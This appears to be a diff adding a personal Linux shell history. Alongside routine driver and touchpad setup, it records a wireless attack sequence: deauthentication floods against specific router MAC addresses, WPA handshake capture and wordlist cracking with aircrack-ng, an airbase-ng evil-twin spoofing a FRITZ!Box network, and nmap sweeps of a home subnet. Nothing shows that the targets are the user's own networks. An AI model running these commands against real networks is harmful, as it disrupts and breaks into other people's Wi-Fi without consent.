@@ -1,0 +1,500 @@
+sudo rm -rf .Trash-1000/
+ls
+ls -a
+iw list
+iw dev
+iw dev
+iw dev
+lsusb
+iwdev
+iw dev
+ip link
+pacman -S wireless_tools
+sudo pacman -S wireless_tools
+iwconfig
+iwconfig list
+iwconfig wlp0s20f0u3 
+udo ifconfig wlp0s20f0u3 up
+sudo ifconfig wlp0s20f0u3 up
+ls#
+ls
+iw dev
+iw list wlp3s0
+iw wlp3s0 list
+iw wlp3s0 list
+clear
+iw wlp3s0 list
+iw dev wlp3s0 list
+iw #phy0 list
+git clone https://github.com/oblique/create_ap
+cd create_ap/
+ls
+cat howto/
+cd howto/
+ls
+cat realtek.md 
+ls
+cat realtek.md 
+cd ..
+cd ..
+#pacman -S base-devel linux-headers dkms git
+pacman -R hostapd
+sudo pacman -S base-devel linux-headers dkms git
+pacman -R hostapd
+sudo pacman -R hostapd
+sudo pacman -S hostapd
+sudo pacman -S base-devel linux-headers dkms git
+sudo pacman -S base-devel linux-headers dkms git
+sudo pacman -S base-devel linux-headers dkms git
+sudo pacman -R hostapd
+git clone https://github.com/pvaret/rtl8192cu-fixes.git
+dkms add rtl8192cu-fixes
+dkms install 8192cu/1.9
+cp rtl8192cu-fixes/blacklist-native-rtl8192.conf /etc/modprobe.d
+cp rtl8192cu-fixes/8192cu-disable-power-management.conf /etc/modprobe.d
+sudo dkms add rtl8192cu-fixes
+sudodkms install 8192cu/1.9
+sudo cp rtl8192cu-fixes/blacklist-native-rtl8192.conf /etc/modprobe.d
+sudocp rtl8192cu-fixes/8192cu-disable-power-management.conf /etc/modprobe.d
+sudo cp rtl8192cu-fixes/8192cu-disable-power-management.conf /etc/modprobe.d
+reboot
+cd create_ap/
+cd howto/
+car realtek.md 
+cat realtek.md 
+sudo pacman -S hostapd
+sudo pacman -S base-devel linux-headers dkms git
+sudo pacman -S base-devel linux-headers
+base-level
+base-devel
+CD ..
+LS
+CD ..
+cd ..
+ls
+nano create_ap
+nano create_ap.conf 
+./ create_ap
+ls
+chmod +x create_ap
+./create_ap 
+iwlist
+iw dev
+iwconfig
+./create_ap --help
+./create_ap wlp0s20f0u4 wlp3s0 test 1234
+sudo ./create_ap wlp0s20f0u4 wlp3s0 test 1234
+sudo ./create_ap wlp3s0 wlp0s20f0u4 test 1234
+iw list
+sudo airmon-ng check
+sudo airmon-ng check kill
+iw dev
+sudo airmon-ng start wlp3s0
+iw dev
+sudo airmon-ng stop wlp3s0mon
+iw dev
+git clone http://mama.indstate.edu/users/ice/tree/
+pacman -S tree
+sudo pacman -S tree
+tree
+ls -a
+cd .secret/
+ls
+cd 0
+ls
+cd ..
+tree
+tree-view
+treeview
+tree
+tree -d
+tree
+rm Z Y y W w v T 0t
+rm  -r z Z Y y W w v T t
+ls
+mkdir z
+cd z
+touch 18
+cd ..
+ls
+tree 
+find /dir -type d -empty -delete
+find * -type d -empty -delete
+ls
+tree
+SFRCe0RJUjNdEXzFuX1BsNDFuX1NpN2V9
+ls
+ls -a
+unzip Eternal_Loop.zip 
+ls
+unzip 37366.zip 
+ls -a
+ls
+ cd Downloads/
+ls
+cd .secret/
+ls
+tree
+clear 
+tree
+1ls
+cd ..
+cd ..
+ls
+cd ..
+cd ..
+cd /
+ls
+cd home/yannes/Downloads/
+ls
+cd htb
+ls
+unzip 37366.zip 
+ls
+clear
+unzip 37366.zip 
+unzip 37366.zip 
+ls
+unzip 5900.zip 
+ls
+cd 4
+unzip 49805.zip 
+unzip 49805.zip 
+ls
+unzip 13811.zip 
+clear
+ls
+unzip 13811.zip 
+ls
+ls -a
+rm -rf 13811.zip  37366.zip  49805.zip  5900.zip 
+ls
+unzip 45133
+rm -rf 45133.zip 
+unzip 4030.zip 
+rm -rf 4030
+unzip 12132
+ls -a
+rm -a 12132.zip  4030.zip 
+rm -rf 12132.zip  4030.zip 
+unzip 33130.zip 
+ls
+rm 33130.zip 
+ls
+unzip 8789.zip 
+ls 
+cd 37715.zip
+shutdown now
+iw dev
+sudo airmon-ng check
+sudo airmon-ng check kill
+sudo airmon-ng start wlp0s20f0u4
+iw dev
+sudo airmon-ng stop wlp0s20f0u4
+iw dev
+sudo airmon-ng stop wlp0s20f0u4mon
+iw dev
+logout
+ls
+xinput
+xinput -list 12
+xinput -list-props 12
+xinput -set-props 12 313 1
+xinput set-props 12 313 1
+xinput -set-props 12 313 1
+xinput -set 12 313 1
+xinput -set-props 12 313 1
+xinput -set-prop 12 313 1
+ls
+touch create_hotspot.sh
+ls
+nano create_hotspot.sh 
+ls
+chmod create_hotspot.sh +x
+chmod +x create_hotspot.sh
+ls
+./create_hotspot.sh 
+sudo ./create_hotspot.sh 
+ls
+nano create_hotspot.sh 
+sudo ./create_hotspot.sh 
+ls
+cd create_ap/
+ls
+sudo ./create_ap wlp3s0 wlp0s20f0u4 test 1234
+iw dev
+iw dev
+sudo ./create_ap wlp3s0 wlp0s20f0u4 test 12347
+sudo ./create_ap wlp3s0 wlp0s20f0u4 test 1234567890
+sudo ./create_ap
+ls
+cd howto/
+ls
+cat realtek.md 
+ls
+cd ..
+ls
+cat Makefile 
+cat README.md 
+systemctl create_ap
+systemctl start create_ap
+ls
+iw dev
+ls
+ls
+rm create_hotspot.sh 
+ls
+clear
+ls
+airmon-ng help
+sudo airmon-ng help
+sudo airmon-help
+sudo airmon -help
+sudo airmon-ng -help
+sudo airmon
+sudo airmon-ngy
+close
+clear
+aireplay-ng --deauth 5 -a DA:FF:1A:65:EB:94
+aireplay-ng --deauth 5 -a DA:FF:1A:65:EB:94 wlp0s20f0u4mon
+sudo aireplay-ng --deauth 5 -a DA:FF:1A:65:EB:94 wlp0s20f0u4mon
+ls
+iw dev
+sudo airmon-ng check
+sudo airmon-ng check  kill
+sudo airmon-ng start wlp0s20f0u4
+iwconfig
+clear
+iw list
+clear
+iw dev
+sudo airodump-ng wlp0s20f0u4mon
+sudo airodump-ng -bssid DA:FF:1A:65:EB:94 -c 6 --write wpahandshake wlp0s20f0u4mon
+sudo airodump-ng --bssid DA:FF:1A:65:EB:94 -c 6 --write wpahandshake wlp0s20f0u4mon
+ls
+aircrack-ng wpahandshake-01.cap ./wfuzz/wordlist/common_pass.txt
+aircrack-ng wpahandshake-01.cap -w ./wfuzz/wordlist/common_pass.txt
+aircrack-ng wpahandshake-01.cap -w wfuzz/wordlist/common_pass.txt
+aircrack-ng wpahandshake-01.cap -w ./wfuzz/wordlist/others/common_pass.txt 
+clear
+sudo aireplay-ng --deauth 100 -a 34:81:C4:CE:D8:20 wlp0s20f0u4mon
+iw dev
+iw config
+iwconfig
+brctl addbr evil 
+sudo brctl addbr evil 
+sudo brctl addbr evil wlp3s0
+sudo brctl addif evil wlp3s0
+iwconfig
+iwconfig
+iwconfig
+sudo brctl addif evil eth0
+iwconfig
+ifconfig
+sudo brctl addif evil lobal
+iw dev
+sudo pacman -S bridge-utils
+iw dev
+sudo airmon-ng start wlp0s20f0u4
+iw dev
+airodump-ng wlp0s20f0u4mon
+sudo airodump-ng wlp0s20f0u4mon
+airbase-ng -a 34:81:C4:CE:D8:20 FRITZ\!Box\ 7560\ DN -c 6 34:81:C4:CE:D8:20 wlp0s20f0u4mon
+sudo airbase-ng -a 34:81:C4:CE:D8:20 FRITZ\!Box\ 7560\ DN -c 6 34:81:C4:CE:D8:20 wlp0s20f0u4mon
+sudo airbase-ng -a 34:81:C4:CE:D8:20 -essid FRITZ\!Box\ 7560\ DN -c 6 34:81:C4:CE:D8:20 wlp0s20f0u4mon
+airbase-ng -h
+airbase-ng --help
+sudo airbase-ng -a 34:81:C4:CE:D8:20 -essid FRITZ\!Box\ 7560\ DN -c 6 wlp0s20f0u4mon
+iw dev
+sudo airbase-ng -a 34:81:C4:CE:D8:20 --essid FRITZ\!Box\ 7560\ DN -c 6 wlp0s20f0u4mon
+ls
+cd Do
+cd Downloads/
+ls
+sudo aireplay --dauth 5 -a 00:09:4F:7E:39:E9 wlp0s20f0u4mon
+sudo aireplay-ng --dauth 5 -a 00:09:4F:7E:39:E9 wlp0s20f0u4mon
+sudo aireplay-ng --deauth 5 -a 00:09:4F:7E:39:E9 wlp0s20f0u4mon
+sudo aireplay-ng --deauth 5 -a 00:09:4F:7E:39:E9 wlp0s20f0u4mon
+sudo aireplay-ng --deauth 50 -a 00:09:4F:7E:39:E9 wlp0s20f0u4mon
+sudo aireplay-ng --deauth 50 -a 00:09:4F:7E:39:E9 wlp0s20f0u4mon
+sudo aireplay-ng --deauth 100 -a 00:09:4F:7E:39:E9 wlp0s20f0u4mon
+sudo aireplay-ng --deauth 100 -a 00:09:4F:7E:39:E9 wlp0s20f0u4mon
+sudo aireplay-ng --deauth 100 -a 00:09:4F:7E:39:E9 wlp0s20f0u3mon
+sudo aireplay-ng --deauth 100 -a 00:09:4F:7E:39:E9 wlp0s20f0u3mon
+iw dev
+sudo airmon-ng start wlp0s20f0u4
+iw dev
+airdump-ng wlp0s20f0u4mon
+sudo airdump-ng wlp0s20f0u4mon
+sudo airodump-ng wlp0s20f0u4mon
+airodump-ng --bssid 00:09:4F:7E:39:E9 -c 11 --write Digiboxwifi wlp0s20f0u4mon
+sudo airodump-ng --bssid 00:09:4F:7E:39:E9 -c 11 --write Digiboxwifi wlp0s20f0u4mon
+sudo airodump-ng wlp0s20f0u4mon
+sudo airodump-ng --bssid 00:09:4F:7E:39:E9 -c 11 --write Digiboxwifi wlp0s20f0u4mon
+sudo airodump-ng --bssid 00:09:4F:7E:39:E9 -c 11 --write Digiboxwifi wlp0s20f0u4mon
+iw dev
+sudo airmon-ng start wlp0s20f0u3
+sudo airodump-ng wlp0s20f0u4mon
+sudo airodump-ng wlp0s20f0u3mon
+sudo airodump-ng --bssid 00:09:4F:7E:39:E9 -c 11 --write Digiboxwifi wlp0s20f0u4mon
+sudo airodump-ng --bssid 00:09:4F:7E:39:E9 -c 11 --write Digiboxwifi wlp0s20f0u3mon
+sudo airodump-ng --bssid 00:09:4F:7E:39:E9 -c 11 --write Digiboxwifi wlp0s20f0uc
+clear
+ls
+#iwdev
+iwdev
+iw dev
+clear 
+ls
+ls A
+ls -a
+cd Downloads/
+ls
+./Etcher.AppImage 
+ls
+iw dev
+ifconfig
+iw info
+iw phy0 info
+cd Downloads/
+ls
+mv ./Etcher.AppImage ./../
+ls
+cd ..
+ls
+./Etcher.AppImage 
+sudo airodump 
+sudo airodump
+sudo airodump-ng
+iw dev
+sudo airodump wlp3s0
+sudo airodump-ng wlp3s0
+sudo airodump-ng wlp3s0
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsbkl
+lsblk
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+mount 009
+cd /etc
+ls
+cd ..
+cd usr/
+cd ..
+cd run
+cd media/
+ls
+cd yannes/
+ls
+ls
+sudo fdisk -l
+sudo fdisk 
+sudo blkid
+lsblk
+lsblk -a
+mount sbd
+sudo mount /dev/sbd
+sudo mount /dev/sbd/
+nmap 192.168.178.*
+nmap 192.168.178.*
+sudo xinput
+sudo xinput 13 list-rpops
+sudo xinput 13 list-props
+sudo xinput list-props 13
+sudo xinput set-prop 13 313 1
+sudo xinput set-prop 13 314 1
+nmap 192.168.178.*
+nmap 192.168.178.*
+clear
+nmap 192.168.178.*
+git clone https://github.com/T2brozz/pythonprojects
+git clone https://github.com/T2brozz/pythonprojects
+ls
+cd pythonprojects/
+ls
+cd Python/
+ls
+cd instergram_follwer/
+ls
+nano crawlrequests.py 
+ssh yannes.tallowitz@192.168.178.1
+nmap -sC 192.18.178.*
+nmap -sC 192.168.178.*
+sudo xinput list-props 13
+sudo xinput set-prop 13 313 1
+sudo xinput set-prop 13 314 1
+cd /usR
+cd /usR
+cd /usRr
+cd /usr
+cd share
+cd X11
+ls
+cd xorg.conf.d/
+ls
+nano 40-libinput.conf 
+cd /etc
+cd X11/
+ls
+cd xorg.conf.d/
+ls
+nano 40-libinput.conf 
+nano 00-keyboard.conf 
+nano 40-libinput.conf 
+sudo libinput 
+sudo libinput  list
+sudo libinput -list
+sudo libinput --list
+sudo xinput --list
+sudo xinput list-props ELAN0501:01 04F3:3060 Touchpad
+sudo xinput list-props Touchpad
+sudo xinput list-props "ELAN0501:01 04F3:3060 Touchpad"
+sudo xinput set-prop "ELAN0501:01 04F3:3060 Touchpad" "libinput Natural Scrolling Enabled" 1
+sudo xinput list-props "ELAN0501:01 04F3:3060 Touchpad"
+sudo /etc/X11/xorg.conf.d/50-touchpad.conf
+sudo nano/etc/X11/xorg.conf.d/50-touchpad.conf
+sudo nano /etc/X11/xorg.conf.d/50-touchpad.conf
+ls
+reboot
+nmap 192.168.178.*
+iwlist
+iw dev
+iwlist wlp3s0
+iwlist wlp3s0 scanning
+iwlist wlp3s0 scanning |grep esssid
+iwlist wlp3s0 scanning |grep ESSID
+iw dev
+iwlist wlp0s20f0u4 scanning |grep ESSID
+iwlist wlp0s20f0u4 scanning |grep ESSID,BSSID
+iwlist wlp0s20f0u4 scanning |grep -e ESSID -eBSSID
+iwlist wlp0s20f0u4 scanning |grep -e ESSID -e BSSID
+iwlist wlp0s20f0u4 scanning |grep  -e BSSID
+iwlist wlp0s20f0u4 scanning |grep Schule
+iwlist wlp0s20f0u4 scanning 
+sudo airdumg-ng
+sudo airodumg-ng wlp0s20f0u4
+sudo airodumd-ng wlp0s20f0u4
+sudo airodump-ng wlp0s20f0u4
+iw dev
+reboot
+sudo airmon-ng 
+sudo airmon-ng 
+iw dev
+sudo airmon-ng wlp0s20f0u4
+sudo airmon-ng start wlp0s20f0u4
+iw dev
+IW DEV
+iw dev
+pip install opencv-python
